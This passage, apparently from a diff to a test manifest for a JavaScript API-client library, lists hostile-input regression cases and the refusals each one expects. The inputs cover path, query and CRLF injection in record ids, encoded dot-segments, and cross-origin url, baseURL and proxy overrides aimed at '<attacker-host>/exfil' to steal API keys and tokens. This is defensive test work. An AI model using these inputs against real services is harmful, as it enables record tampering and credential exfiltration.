+    {
+      "id": "f1-update-fragment-escapes-to-parent-refuses",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.update('5#', item)",
+      "module": "esm",
+      "description": "HOSTILE INPUT (adversarial re-probe): route /u/:id/draft, operations.update('5#', item) previously escaped the URL segment and sent PUT /u/5 (overwriting the PARENT record) \u2014 must now THROW before dispatch, zero requests reach the wire"
+    },
+    {
+      "id": "f1-delete-query-injection-refuses",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('5?a=1')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (adversarial re-probe): route /flat/:id, operations.delete('5?a=1') previously sent DELETE /flat/5?a=1 (caller-controlled query injection) \u2014 must now THROW before dispatch, zero requests reach the wire"
+    },
+    {
+      "id": "f1-update-query-injection-refuses",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.update('5?force=1', item)",
+      "module": "esm",
+      "description": "HOSTILE INPUT (adversarial re-probe): route /h38/:id, operations.update('5?force=1', item) previously sent PUT /h38/5?force=1 (caller-controlled ?force query flag can change delete/update semantics on real APIs) \u2014 must now THROW before dispatch, zero requests reach the wire"
+    },
+    {
+      "id": "f1-delete-crlf-injection-refuses",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('5\\r\\nX-Evil: 1')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (invented beyond the report): a raw CR/LF in the id enables HTTP request-line/header injection \u2014 THROWS before dispatch, zero requests reach the wire"
+    },
+    {
+      "id": "f1-delete-encoded-crlf-injection-refuses",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('5%0d%0aX-Evil:1')",
+      "module": "esm",
+      "description": "HOSTILE INPUT (invented beyond the report): the same CRLF injection, percent-encoded \u2014 must be caught by the decoded-string check too, not just the raw one"
+    },
+    {
+      "id": "f1-delete-encoded-query-injection-refuses",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('5%3Fa%3D1')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (invented beyond the report): a percent-encoded '?a=1' must be caught after decoding, mirroring the existing encoded-traversal coverage"
+    },
+    {
+      "id": "f1-delete-nul-byte-refuses",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('5\\u0000evil')",
+      "module": "esm",
+      "description": "HOSTILE INPUT (invented beyond the report): a raw NUL byte is never valid unencoded in an HTTP request path \u2014 THROWS with a directed error before dispatch"
+    },
+    {
+      "id": "f1-delete-embedded-space-refuses",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('5 evil')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (invented beyond the report): an embedded raw space breaks HTTP request-line parsing \u2014 distinct from the pre-existing whitespace-ONLY check \u2014 THROWS before dispatch"
+    },
+    {
+      "id": "f2-delete-plain-object-id-refuses",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete({})",
+      "module": "esm",
+      "description": "HOSTILE INPUT (adversarial re-probe, the commonest real mistake): passing the whole record instead of record.id \u2014 delete({}) previously sent DELETE /h21/[object%20Object] \u2014 must now THROW before dispatch"
+    },
+    {
+      "id": "f2-update-plain-object-id-refuses",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.update({}, item)",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (adversarial re-probe): update({}) previously sent PUT /h37/[object%20Object] \u2014 must now THROW before dispatch"
+    },
+    {
+      "id": "f2-delete-infinity-id-refuses",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(Infinity)",
+      "module": "esm",
+      "description": "HOSTILE INPUT (adversarial re-probe): Infinity previously sent /h15/Infinity \u2014 Number.isFinite must reject it before dispatch"
+    },
+    {
+      "id": "f2-delete-neg-infinity-id-refuses",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(-Infinity)",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (adversarial re-probe): -Infinity previously sent /h16/-Infinity \u2014 Number.isFinite must reject it before dispatch"
+    },
+    {
+      "id": "f2-delete-boolean-id-refuses",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(true)",
+      "module": "esm",
+      "description": "HOSTILE INPUT (adversarial re-probe): true previously sent /h26/true \u2014 a boolean is not a valid id type, must THROW before dispatch"
+    },
+    {
+      "id": "f2-delete-array-id-refuses",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(['a','b'])",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (adversarial re-probe): ['a','b'] previously sent /h22/a,b \u2014 an array is not a valid id type, must THROW before dispatch"
+    },
+    {
+      "id": "f2-delete-date-id-refuses",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(new Date(0))",
+      "module": "esm",
+      "description": "HOSTILE INPUT (adversarial re-probe): new Date(0) previously sent its full toString() as the id \u2014 a Date is not a valid id type, must THROW before dispatch"
+    },
+    {
+      "id": "f2-delete-symbol-id-refuses",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(Symbol('s'))",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (adversarial re-probe): Symbol('s') previously sent /h28/Symbol(s) \u2014 a symbol is not a valid id type, must THROW before dispatch"
+    },
+    {
+      "id": "f3-query-only-id-placeholder-refuses",
+      "acceptance": "F3",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "route '/q-only?uid=:id'",
+      "module": "esm",
+      "description": "HOSTILE INPUT (adversarial re-probe): a route whose ':id' placeholder lives only in the QUERY STRING (never the URL PATH) previously satisfied the addressability guard and produced a collection-shaped DELETE /q-only?uid=5 \u2014 must now THROW before dispatch"
+    },
+    {
+      "id": "f4-overlong-utf8-percent-escape-refuses",
+      "acceptance": "F4",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('%c0%ae%c0%ae')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (adversarial re-probe): a malformed/overlong percent-escape previously made decodeURIComponent throw and was then let through unmodified \u2014 delete('%c0%ae%c0%ae') previously sent DELETE /h11/%c0%ae%c0%ae \u2014 an undecodable id must now be refused, not passed through"
+    },
+    {
+      "id": "f4-bare-trailing-percent-refuses",
+      "acceptance": "F4",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('5%')",
+      "module": "esm",
+      "description": "HOSTILE INPUT (invented beyond the report): a bare trailing '%' is also a malformed percent-escape decodeURIComponent throws on \u2014 must be refused the same way as the overlong-UTF-8 case"
+    },
+    {
+      "id": "f5-delete-bare-dot-refuses",
+      "acceptance": "F5",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('.')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (fix-route-param-dot-segment-detector, RELEASE BLOCKER): route /dot/:id, operations.delete('.') normalizes exactly like '..' does ('/dot/.' -> '/dot/') but was NOT refused by the prior '..'-only blacklist \u2014 must now THROW before dispatch, zero requests reach the wire."
+    },
+    {
+      "id": "f5-update-bare-dot-refuses",
+      "acceptance": "F5",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.update('.', item)",
+      "module": "esm",
+      "description": "HOSTILE INPUT (fix-route-param-dot-segment-detector, RELEASE BLOCKER): route /dot-upd/:id, operations.update('.', item) \u2014 the same bare dot-segment gap on the update path \u2014 must now THROW before dispatch, zero requests reach the wire."
+    },
+    {
+      "id": "f5-delete-encoded-dot-lower-refuses",
+      "acceptance": "F5",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('%2e')",
+      "module": "esm",
+      "description": "HOSTILE INPUT (fix-route-param-dot-segment-detector, RELEASE BLOCKER): a single-encoded '.' (lowercase hex) decodes to a bare dot-segment \u2014 must be refused after decoding, zero requests reach the wire."
+    },
+    {
+      "id": "f5-delete-encoded-dot-upper-refuses",
+      "acceptance": "F5",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('%2E')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (fix-route-param-dot-segment-detector, RELEASE BLOCKER): a single-encoded '.' (uppercase hex digit) decodes identically to '%2e' \u2014 must be refused after decoding, zero requests reach the wire."
+    },
+    {
+      "id": "f5-delete-double-encoded-dot-refuses",
+      "acceptance": "F5",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('%252e')",
+      "module": "esm",
+      "description": "HOSTILE INPUT (fix-route-param-dot-segment-detector, RELEASE BLOCKER): a double-encoded '.' ('%25' -> '%', then '%2e' -> '.') must be refused after the bounded decode loop fully resolves it to a bare dot-segment, zero requests reach the wire."
+    },
+    {
+      "id": "f5-delete-triple-dot-refuses",
+      "acceptance": "F5",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('...')",
+      "module": "cjs",
+      "description": "HOSTILE INPUT (fix-route-param-dot-segment-detector, RELEASE BLOCKER): three dots is still nothing-but-dots \u2014 proves the fix refuses a bare dot-segment of ANY length, not just exactly '.' or '..' \u2014 must THROW before dispatch, zero requests reach the wire."
+    },
+    {
+      "id": "pos-zero-id-succeeds",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(0)",
+      "module": "cjs",
+      "description": "POSITIVE CONTROL: the legitimate numeric id 0 must still resolve and dispatch DELETE /pos-zero/0 \u2014 a guard that refuses valid input is its own defect"
+    },
+    {
+      "id": "pos-leading-zero-string-id-succeeds",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete('007')",
+      "module": "esm",
+      "description": "POSITIVE CONTROL: a leading-zero string id ('007') must still resolve and dispatch DELETE /pos-007/007"
+    },
+    {
+      "id": "pos-uuid-id-succeeds",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(uuid)",
+      "module": "cjs",
+      "description": "POSITIVE CONTROL: a UUID id must still resolve and dispatch correctly (hyphens are not in the hostile character class)"
+    },
+    {
+      "id": "pos-objectid-hex24-id-succeeds",
+      "acceptance": "F1",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(objectId)",
+      "module": "esm",
+      "description": "POSITIVE CONTROL: a 24-hex Mongo-style ObjectId must still resolve and dispatch correctly"
+    },
+    {
+      "id": "pos-bigint-id-succeeds",
+      "acceptance": "F2",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "operations.delete(10n)",
+      "module": "cjs",
+      "description": "POSITIVE CONTROL: a bigint id must still resolve and dispatch DELETE /pos-bigint/10 \u2014 bigint is an explicitly supported id type"
+    },
+    {
+      "id": "pos-nested-route-valid-id-succeeds",
+      "acceptance": "F3",
+      "driver": "crud-id-hostile-inputs",
+      "pattern": "useMinder('/pos-t/:id/comments').operations.delete(id)",
+      "module": "esm",
+      "description": "POSITIVE CONTROL: a nested route with a genuine ':id' PATH placeholder and a valid id must still resolve and dispatch DELETE /pos-t/42/comments"
+    },
+    {
+      "id": "f5-get-autofetch-dead-port-no-unhandled-rejection-no-crash",
+      "acceptance": "F5",
+      "driver": "query-failure-safety",
+      "pattern": "useMinder(route) auto-fetch (GET, mount-time) against a dead port",
+      "module": "cjs",
+      "description": "FAILURE PATH / PROCESS SAFETY: a failed GET auto-fetch through <MinderDataProvider> against a REAL dead port must NOT crash the Node process via an unhandled promise rejection in the query path (reproduced independent of offline support), and the failure must still surface through the hook's normal success:false/error channel \u2014 driven in an isolated child process so a real crash cannot take the rest of the wire suite down with it"
+    },
+    {
+      "id": "n3-ws-connect-dead-port-discarded-no-unhandled-rejection-no-crash",
+      "acceptance": "N3",
+      "driver": "realtime-safety",
+      "pattern": "useWebSocket().connect() against a dead port, promise DISCARDED",
+      "module": "cjs",
+      "description": "FAILURE PATH / PROCESS SAFETY: calling useWebSocket().connect() against a REAL dead port and dropping the returned promise (no .catch(), no await \u2014 the reported hostile pattern) must NOT crash the Node process via an unhandled promise rejection in the realtime path \u2014 driven in an isolated child process so a real crash cannot take the rest of the wire suite down with it"
+    },
+    {
+      "id": "n3-ws-connect-dead-port-caught-still-rejects",
+      "acceptance": "N3",
+      "driver": "realtime-safety",
+      "pattern": "useWebSocket().connect() against a dead port, promise explicitly .then()/caught",
+      "module": "cjs",
+      "description": "NEGATIVE CONTROL: the SAME useWebSocket().connect() call against a real dead port, when the caller DOES attach a rejection handler, must still observe the genuine connection failure \u2014 proves the internal safety net that stops the unhandled-rejection crash does not also swallow the error for a caller who wants to handle it"
+    },
+    {
+      "id": "n3-sse-transport-direct-connect-dead-port-discarded-no-crash",
+      "acceptance": "N3",
+      "driver": "realtime-safety",
+      "pattern": "new SseTransport(...).connect() (minder-data-provider/realtime subpath, NO hook, NO MinderContext) against a dead port, promise DISCARDED",
+      "module": "cjs",
+      "description": "FAILURE PATH / PROCESS SAFETY: SseTransport is exported directly from the './realtime' subpath, so a consumer can construct and connect() it with zero hook/context in between \u2014 useWebSocket()'s guard in src/hooks/index.ts never runs on this path. A discarded connect() promise against a REAL dead port must NOT crash the Node process via an unhandled promise rejection \u2014 driven in an isolated child process so a real crash cannot take the rest of the wire suite down with it"
+    },
+    {
+      "id": "n3-sse-transport-direct-connect-dead-port-caught-still-rejects",
+      "acceptance": "N3",
+      "driver": "realtime-safety",
+      "pattern": "new SseTransport(...).connect() against a dead port, promise explicitly .then()/caught",
+      "module": "cjs",
+      "description": "NEGATIVE CONTROL: the SAME direct SseTransport connect() call against a real dead port, when the caller DOES attach a rejection handler, must still observe the genuine connection failure (SSE_MAX_ATTEMPTS) \u2014 proves the internal safety net does not swallow the error for a caller who wants to handle it"
+    },
+    {
+      "id": "n3-sse-context-realtimemanager-connect-dead-port-discarded-no-crash",
+      "acceptance": "N3",
+      "driver": "realtime-safety",
+      "pattern": "useMinderContext().realtimeManager.connect() (transport:'sse', bypasses useWebSocket() hook entirely) against a dead port, promise DISCARDED",
+      "module": "cjs",
+      "description": "FAILURE PATH / PROCESS SAFETY: with <MinderDataProvider> configured for realtime.transport:'sse', realtimeManager is a LazySseTransport reached via useMinderContext() directly \u2014 the exact bypass named in the architect finding ('reachable via useMinderContext().realtimeManager.connect() which bypasses the hook guard entirely'). A discarded connect() promise against a REAL dead port must NOT crash the Node process \u2014 driven in an isolated child process"
+    },
+    {
+      "id": "n3-sse-context-realtimemanager-connect-dead-port-caught-still-rejects",
+      "acceptance": "N3",
+      "driver": "realtime-safety",
+      "pattern": "useMinderContext().realtimeManager.connect() (transport:'sse') against a dead port, promise explicitly .then()/caught",
+      "module": "cjs",
+      "description": "NEGATIVE CONTROL: the SAME direct realtimeManager.connect() call against a real dead port, when the caller DOES attach a rejection handler, must still observe the genuine connection failure \u2014 proves the internal safety net does not mask genuine failures from a caller who wants to handle them"
+    },
+    {
+      "id": "sec-urloverride-cross-origin-refuses-no-header-leak",
+      "acceptance": "SECURITY-2",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, params, { urlOverride: 'http://<attacker-host>/exfil' })",
+      "module": "cjs",
+      "description": "SECURITY (credential exfiltration): apiClient.request() called directly with a cross-origin urlOverride pointing at a SECOND, independent server must throw before dispatch \u2014 zero requests reach EITHER server, and the route's declared X-Api-Key header never reaches the attacker host"
+    },
+    {
+      "id": "sec-urloverride-path-only-still-resolves",
+      "acceptance": "SECURITY-2",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, params, { urlOverride: '/things2' })",
+      "module": "esm",
+      "description": "POSITIVE CONTROL: the SAME direct apiClient.request() surface, given a legitimate same-origin PATH-ONLY urlOverride (exactly what useMinder.helpers.ts's stripIdPathSegment always produces), still resolves and dispatches correctly \u2014 the security boundary does not break the legitimate internal use"
+    },
+    {
+      "id": "sec-options-url-cross-origin-refuses-no-header-leak",
+      "acceptance": "SECURITY-2-ROUND2",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, params, { url: 'http://<attacker-host>/exfil' })",
+      "module": "cjs",
+      "description": "SECURITY (credential exfiltration, channel 2 of 3 \u2014 round 2): apiClient.request() called directly with a RAW axios options.url (NOT urlOverride) pointing at a SECOND, independent server must throw before dispatch \u2014 zero requests reach EITHER server, and the route's declared X-Api-Key header never reaches the attacker host"
+    },
+    {
+      "id": "sec-options-baseurl-cross-origin-refuses-no-header-leak",
+      "acceptance": "SECURITY-2-ROUND2",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, params, { baseURL: 'http://<attacker-host>' })",
+      "module": "esm",
+      "description": "SECURITY (credential exfiltration, channel 2 of 3 \u2014 round 2): apiClient.request() called directly with options.baseURL pointing at a SECOND, independent server must throw before dispatch \u2014 zero requests reach EITHER server, and the route's declared X-Api-Key header never reaches the attacker host"
+    },
+    {
+      "id": "sec-options-proxy-cross-origin-refuses-no-header-leak",
+      "acceptance": "SECURITY-2-ROUND2",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, params, { proxy: { host: '<attacker-host>', port } })",
+      "module": "cjs",
+      "description": "SECURITY (credential exfiltration, channel 3 of 3 \u2014 round 2): apiClient.request() called directly with axios's own options.proxy pointing at a SECOND, independent server (acting as an HTTP proxy, receiving the absolute-form request line) must throw before dispatch \u2014 zero requests reach EITHER server, and the route's declared X-Api-Key header never reaches the attacker host"
+    },
+    {
+      "id": "sec-options-transport-hijack-family-refuses",
+      "acceptance": "SECURITY-2-ROUND2",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, params, { adapter, transformRequest, httpAgent })",
+      "module": "esm",
+      "description": "SECURITY (allowlist design proof): apiClient.request() called directly with the 'next round' transport-hijack family (adapter/transformRequest/httpAgent) together must throw before dispatch \u2014 proves the fix is a design-level ALLOWLIST that closes the whole family, not a denylist of only url/baseURL/proxy"
+    },
+    {
+      "id": "sec-dedup-concurrent-distinct-url-overrides-both-refuse-no-collapse",
+      "acceptance": "SECURITY-2-ROUND2",
+      "driver": "method-contract",
+      "pattern": "two concurrent apiClient.request(routeName, undefined, undefined, { url }) calls with DIFFERENT raw url values",
+      "module": "cjs",
+      "description": "DEDUP/CACHE-KEY (phantom success, reopened): the exact reported repro \u2014 two concurrent calls each supplying a different raw options.url used to resolve to the IDENTICAL dedup cache key (both keyed on the route's untouched declared url) while dispatch used whichever options.url won, collapsing two different requests into one wire call and handing both callers the same response body. With the origin/transport guard in place both calls must independently refuse before ever reaching the dedup layer \u2014 zero wire requests, no collapse possible"
+    },
+    {
+      "id": "sec-options-allowlisted-keys-still-forward-positive-control",
+      "acceptance": "SECURITY-2-ROUND2",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, params, { timeout, responseType })",
+      "module": "esm",
+      "description": "POSITIVE CONTROL: the SAME direct apiClient.request() surface, given ONLY allowlisted per-call options (timeout, responseType) that never touch destination/transport, still dispatches normally to the legit server with the route's own header intact \u2014 the allowlist is not over-broad and does not break ordinary per-call option usage"
+    },
+    {
+      "id": "sec-cross-origin-redirect-strips-route-header",
+      "acceptance": "SECURITY-2-ROUND2-NONBLOCKING",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, params) against a route whose OWN host responds with a real cross-origin 302",
+      "module": "cjs",
+      "description": "NON-BLOCKING HARDENING (cross-origin redirect header leak): a real 302 from the route's own trusted host to a SECOND, independent server must still dispatch successfully, but axios's sensitiveHeaders (set from the route's own declared header names) must strip the route's static X-Api-Key header on the cross-origin redirect hop \u2014 the first hop receives it normally, the redirect target never does"
+    },
+    {
+      "id": "item3-options-params-only-resolves-path-no-redundant-query",
+      "acceptance": "ITEM-3",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, undefined, { params: { id } })",
+      "module": "cjs",
+      "description": "the id supplied ONLY via options.params (never the dedicated positional params argument) must still resolve the route's ':id' PATH placeholder with no redundant '?id=' query string \u2014 previously produced a literal DELETE /thing/:id?id=7"
+    },
+    {
+      "id": "item3-unresolved-placeholder-refuses",
+      "acceptance": "ITEM-3",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, undefined, {}) on a ':id' route with NO params supplied via either channel",
+      "module": "esm",
+      "description": "the dispatch-time unresolved-placeholder guard: with no id supplied at all, apiClient.request() must throw a directed error before dispatch instead of sending the literal, unresolved ':id' token on the wire"
+    },
+    {
+      "id": "item4-junk-method-override-falls-back-to-declared-method",
+      "acceptance": "ITEM-4",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data, undefined, { method: '' }) on a route declared POST",
+      "module": "cjs",
+      "description": "a JUNK (non-nullish but invalid) options.method override must fall back to the route's DECLARED method (POST), never discard it for a generic GET fallback"
+    },
+    {
+      "id": "item5-interior-invalid-method-refuses-directed-error",
+      "acceptance": "ITEM-5",
+      "driver": "method-contract",
+      "pattern": "apiClient.request(routeName, data) on a route declared method:'PO ST' (interior space)",
+      "module": "esm",
+      "description": "an interior-invalid HTTP method must produce a directed error before any transport call \u2014 zero requests reach the wire and the error is never the raw transport TypeError ('_retryCount')"
+    },
+    {
+      "id": "item6-computeroutevalidation-repeated-placeholder-both-substituted-valid",
+      "acceptance": "ITEM-6",
+      "driver": "method-contract",
+      "pattern": "useMinder(registered-route-with-repeated-':id', { params: { id } })",
+      "module": "cjs",
+      "description": "a REGISTERED (not ad-hoc) route repeating the same ':id' placeholder twice, mounted with the id supplied via the hook's params option, must validate successfully and auto-fetch with BOTH occurrences substituted \u2014 computeRouteValidation's own replaceUrlParams previously only substituted the first"
+    },
+    {
+      "id": "sec-requestraw-options-url-cross-origin-refuses-no-token-leak",
+      "acceptance": "SECURITY-FOURTH-CHANNEL",
+      "driver": "method-contract",
+      "pattern": "apiClient.request('/ad-hoc-raw-*', data, params, { url: 'http://<attacker-host>/exfil' }) \u2014 an UNREGISTERED path reaching requestRaw",
+      "module": "esm",
+      "description": "SECURITY (the FOURTH exfiltration channel): requestRaw used to spread the caller's entire otherOptions bag straight into the outgoing config (options.url winning outright, AFTER url: in the object literal). Reachable whenever a route name is path-shaped/unregistered. Must throw before dispatch \u2014 zero requests reach EITHER server, and the caller's bearer token (attached by the same request interceptor as the registered-route path) never reaches the attacker host."
+    },
+    {
+      "id": "sec-requestraw-options-baseurl-cross-origin-refuses-no-token-leak",
+      "acceptance": "SECURITY-FOURTH-CHANNEL",
+      "driver": "method-contract",
+      "pattern": "apiClient.request('/ad-hoc-raw-*', data, params, { baseURL: 'http://<attacker-host>' })",
+      "module": "cjs",
+      "description": "SECURITY (fourth channel, options.baseURL): requestRaw's raw otherOptions spread let a per-call baseURL redirect an ad-hoc/unregistered-path dispatch with the bearer token still attached. Must throw before dispatch \u2014 zero requests reach EITHER server, no token leak."
+    },
+    {
+      "id": "sec-requestraw-options-proxy-cross-origin-refuses-no-token-leak",
+      "acceptance": "SECURITY-FOURTH-CHANNEL",
+      "driver": "method-contract",
+      "pattern": "apiClient.request('/ad-hoc-raw-*', data, params, { proxy: { host, port } })",
+      "module": "esm",
+      "description": "SECURITY (fourth channel, options.proxy): axios's own proxy option, reachable through requestRaw's raw otherOptions spread \u2014 CONNECTs through the attacker host as an HTTP proxy, handing it the entire absolute-form request line. Must throw before dispatch \u2014 zero requests reach EITHER server, no token leak."
+    },
+    {
+      "id": "sec-requestraw-options-transport-hijack-family-refuses",
+      "acceptance": "SECURITY-FOURTH-CHANNEL",
+      "driver": "method-contract",
+      "pattern": "apiClient.request('/ad-hoc-raw-*', data, params, { adapter, transformRequest, httpAgent })",
+      "module": "cjs",
+      "description": "SECURITY (fourth channel, allowlist design proof): requestRaw now routes through the SAME single choke point (extractCallerRequestOptions) as the registered-route path \u2014 proves the transport-hijack family is refused there too, not only on the registered-route path."
+    },
+    {
+      "id": "sec-requestraw-absolute-url-entry-baseurl-refuses-no-token-leak",
+      "acceptance": "SECURITY-FOURTH-CHANNEL",
+      "driver": "method-contract",
+      "pattern": "apiClient.request('http://<legit-host>/absolute-adhoc', data, params, { baseURL: 'http://<attacker-host>' })",
+      "module": "esm",
+      "description": "SECURITY (fourth channel, the OTHER requestRaw entry point): proves the fix covers the isAbsoluteUrl===true branch (an https?:// route name), not only the leading-slash unregistered-path branch. Must throw before dispatch \u2014 zero requests reach EITHER server, no token leak."
+    },
+    {
+      "id": "sec-usemander-axiosconfig-url-cross-origin-refuses",
+      "acceptance": "SECURITY-FOURTH-CHANNEL",
+      "driver": "method-contract",
+      "pattern": "useMinder('/ad-hoc-axios-config', { axiosConfig: { url: 'http://<attacker-host>/exfil' } }) \u2014 the real public hook, no direct apiClient.request() call",
+      "module": "cjs",
+      "description": "SECURITY (fourth channel, END-TO-END public-API reachability): useMinder.ts's axiosConfig passthrough on an unregistered path-shaped route reaches requestRaw exactly like the direct apiClient.request() cases above. Must never touch EITHER server and must surface the refusal as a query failure (success:false, error set), not silently dispatch."
+    },
+    {
+      "id": "sec-dedup-params-divergence-no-cross-tenant-collapse",
+      "acceptance": "SECURITY-DEDUP-KEY",
+      "driver": "method-contract",
+      "pattern": "two concurrent apiClient.request(routeName, undefined, undefined, { params }) calls with DIFFERENT params on the SAME GET route, deduplication enabled",
+      "module": "esm",
+      "description": "DEDUP KEY DIVERGENCE (genuinely exercised, not just refused): the reported repro \u2014 two concurrent GETs differing only in params ({q:'alpha'}/{q:'beta'}) used to collapse into ONE wire request (params was never in the cache key) and hand BOTH callers the same response. Must dispatch as TWO separate wire requests and each caller must receive the response matching its OWN request."
+    },
+    {
+      "id": "sec-dedup-headers-divergence-no-cross-tenant-collapse",
+      "acceptance": "SECURITY-DEDUP-KEY",
+      "driver": "method-contract",
+      "pattern": "two concurrent apiClient.request(routeName, undefined, undefined, { headers }) calls with DIFFERENT per-call headers on the SAME GET route, deduplication enabled",
+      "module": "cjs",
+      "description": "DEDUP KEY DIVERGENCE, CHANNEL 2 (cross-tenant disclosure): the reported repro verbatim \u2014 two concurrent GETs differing only in a per-call header ({'X-User':'alice'}/{'X-User':'bob'}) used to collapse into ONE wire request under per-request auth (\"bob received alice's response\"). Must dispatch as TWO separate wire requests, each carrying its own caller's header."
+    },
+    {
+      "id": "sec-minder-baseurl-registered-route-refuses-no-leak",
+      "acceptance": "SECURITY-STANDALONE-MINDER-BASEURL",
+      "driver": "method-contract",
+      "pattern": "standalone minder('registeredRoute', undefined, { baseURL: '<attacker-host>' }) with a registered route declaring its own X-Api-Key header and an ambient bearer token set via minder.config({ token })",
+      "module": "cjs",
+      "description": "BLOCKER 1 (fix-2.2.0-blockers): the identical exfiltration the ApiClient choke point already refuses, reopened through the standalone minder() path, which builds its axios config by hand-picking fields rather than spreading options. Must return success:false (minder() never throws by default) before dispatch \u2014 zero requests reach EITHER server, and neither the route's X-Api-Key header nor the ambient bearer token ever reaches the attacker host."
+    },
+    {
+      "id": "sec-typedminder-baseurl-registered-route-refuses-no-leak",
+      "acceptance": "SECURITY-STANDALONE-MINDER-BASEURL",
+      "driver": "method-contract",
+      "pattern": "createTypedMinder({...}).minder(key, undefined, { baseURL: '<attacker-host>' }) \u2014 the public typed-routes wrapper, not a direct minder() call",
+      "module": "esm",
+      "description": "BLOCKER 1, END-TO-END PUBLIC-API REACHABILITY: createTypedMinder(...).minder() (src/core/typedRoutes.ts) delegates straight into minder() \u2014 proves that delegation actually inherits the fix rather than bypassing it through a second, untouched entry point. Same assertions as the direct minder() case: success:false, zero requests to either server, no header/token leak."
+    },
+    {
+      "id": "sec-dedup-paramsserializer-divergence-no-collapse",
+      "acceptance": "SECURITY-DEDUP-KEY",
+      "driver": "method-contract",
+      "pattern": "two concurrent apiClient.request(routeName, undefined, undefined, { params, paramsSerializer }) calls with the SAME params but DIFFERENT paramsSerializer functions, deduplication enabled",
+      "module": "esm",
+      "description": "SHOULD-FIX 3 (fix-2.2.0-blockers): paramsSerializer is on the forwardable allowlist and is wire-affecting (it changes the encoded query string), but the previous JSON.stringify(requestConfig) dedup key silently dropped function-valued fields, so two calls differing only in paramsSerializer collapsed into ONE wire request. Must dispatch as TWO separate wire requests, each reflecting its OWN caller's serialized query string."
+    },
+    {
+      "id": "sph-standalone-minder-dotdot-id-refuses",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('updateUser', data, { params: { id: '..' } })",
+      "module": "cjs",
+      "description": "RELEASE BLOCKER, EXACT REPRODUCTION: route /users/:id, standalone minder('updateUser', body, { params: { id: '..' } }) previously sent PUT / (the SITE ROOT) carrying the full attacker-controlled body, with success:true and no throw. Must now report success:false (error.code=UNSAFE_ROUTE_PARAM_VALUE), zero requests reach the wire."
+    },
+    {
+      "id": "sph-standalone-minder-fragment-id-refuses",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('tThingStandalone', data, { params: { id: '5#' } })",
+      "module": "esm",
+      "description": "RELEASE BLOCKER, EXACT REPRODUCTION: route /t/:id/comments, standalone minder(..., { params: { id: '5#' } }) previously sent PUT /t/5 (the PARENT resource) plus a redundant/leaking '?id=5%23' query param. Must now refuse before dispatch, zero requests reach the wire."
+    },
+    {
+      "id": "sph-standalone-minder-query-injection-id-refuses",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('flatThingStandalone', data, { params: { id: '5?a=1' } })",
+      "module": "cjs",
